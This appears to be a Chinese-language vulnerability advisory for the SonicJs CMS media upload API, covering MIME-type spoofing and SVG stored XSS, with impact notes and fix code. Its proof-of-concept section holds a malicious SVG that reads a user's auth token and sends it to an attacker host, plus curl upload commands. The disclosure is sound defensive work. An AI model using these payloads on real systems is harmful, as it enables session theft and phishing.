# SONIC-2025-004: Media Upload MIME 验证绕过 + SVG 存储型 XSS

## 基本信息

| 字段 | 值 |
|------|-----|
| **项目** | [SonicJs-Org/sonicjs](https://github.com/SonicJs-Org/sonicjs) |
| **版本** | main branch (截至 2026-05-19) |
| **严重性** | Medium |
| **CVSS 3.1** | 6.1 (AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N) |
| **CWE** | CWE-79 (Stored XSS), CWE-345 (Insufficient Verification of Data Authenticity) |
| **发现日期** | 2026-05-19 |
| **攻击向量** | 网络/需认证/需用户交互 |


## 漏洞概述

SonicJs 的 Media Upload API 对文件类型的验证仅依赖客户端声明的 MIME type（`file.type`），
没有通过 magic bytes 做二次验证。同时 `image/svg+xml` 在允许列表中，
但上传时没有对 SVG 内容做任何安全清理（无 DOMPurify/sanitize）。

攻击者可以：
1. 上传包含 JavaScript 的恶意 SVG 文件（存储型 XSS）
2. 伪造 Content-Type 上传任意文件（如声明 `image/png` 但实际是 HTML）

## 漏洞代码

**文件**: `packages/core/src/routes/api-media.ts` (第18-30行)

```typescript
const fileValidationSchema = z.object({
  name: z.string().min(1).max(255),
  type: z.string().refine(
    (type) => {
      const allowedTypes = [
        'image/jpeg', 'image/jpg', 'image/png', 'image/gif',
        'image/webp', 'image/svg+xml',  // ← SVG 允许，但无 sanitize
        'application/pdf', 'text/plain', ...
      ]
      return allowedTypes.includes(type)
      // ← 仅检查 file.type 属性（客户端声明），无 magic bytes 验证
    },
    { message: 'Unsupported file type' }
  ),
  size: z.number().min(1).max(50 * 1024 * 1024)
})
```

**关键缺失**:
- 无 `file-type` 库对文件头进行二次检测
- 无 SVG sanitize（对比 Ghost 使用 DOMPurify，Payload 使用 validateSvg）
- 上传后直接存入 R2 并生成 public URL，浏览器访问时直接渲染


## PoC (概念验证)

### 攻击1: SVG 存储型 XSS

创建恶意 SVG 文件 `evil.svg`:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">
  <script>
    fetch('/auth/me', {credentials:'include'})
      .then(r=>r.json())
      .then(d=>fetch('https://attacker.com/steal?token='+d.token))
  </script>
  <rect width="100" height="100" fill="red"/>
</svg>
```

```bash
TOKEN="eyJ..."

curl -X POST https://target.workers.dev/api/media/upload \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@evil.svg;type=image/svg+xml"

# 返回 publicUrl: https://pub-xxx.r2.dev/uploads/abc123.svg
# 任何访问此 URL 的用户都会执行 XSS payload
```

### 攻击2: MIME 类型伪造

```bash
# 将 HTML 文件伪装为 PNG 上传
curl -X POST https://target.workers.dev/api/media/upload \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@phishing.html;type=image/png;filename=image.png"

# file.type 来自 Content-Type，服务端不做 magic bytes 校验
# R2 存储时使用 contentType: file.type，所以可能以错误类型服务
```

## 影响

- 存储型 XSS：窃取其他用户（包括 admin）的 session token
- 钓鱼：上传伪装的 HTML 页面
- 内容投毒：替换合法图片为恶意内容

## 修复建议

```typescript
import { fileTypeFromBuffer } from 'file-type'
import createDOMPurify from 'dompurify'
import { JSDOM } from 'jsdom'

// 1. 添加 magic bytes 验证
const arrayBuffer = await file.arrayBuffer()
const detected = await fileTypeFromBuffer(arrayBuffer)
if (detected && detected.mime !== file.type) {
  return c.json({ error: `MIME type mismatch: declared ${file.type}, detected ${detected.mime}` }, 400)
}

// 2. SVG sanitize
if (file.type === 'image/svg+xml') {
  const window = new JSDOM('').window
  const DOMPurify = createDOMPurify(window)
  const content = new TextDecoder().decode(arrayBuffer)
  const sanitized = DOMPurify.sanitize(content, { USE_PROFILES: { svg: true } })
  if (!sanitized || sanitized.trim() === '') {
    return c.json({ error: 'SVG contains potentially harmful content' }, 400)
  }
  // 用 sanitized 内容替换原始文件
  arrayBuffer = new TextEncoder().encode(sanitized).buffer
}

// 3. 设置安全响应头
await c.env.MEDIA_BUCKET.put(r2Key, arrayBuffer, {
  httpMetadata: {
    contentType: file.type,
    contentDisposition: 'attachment',  // 强制下载而非内联渲染
    // 或者对 SVG 设置 CSP
  }
})
```

## 参考

- [CWE-79: Stored XSS](https://cwe.mitre.org/data/definitions/79.html)
- [CWE-345: Insufficient Verification of Data Authenticity](https://cwe.mitre.org/data/definitions/345.html)
- [OWASP: Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
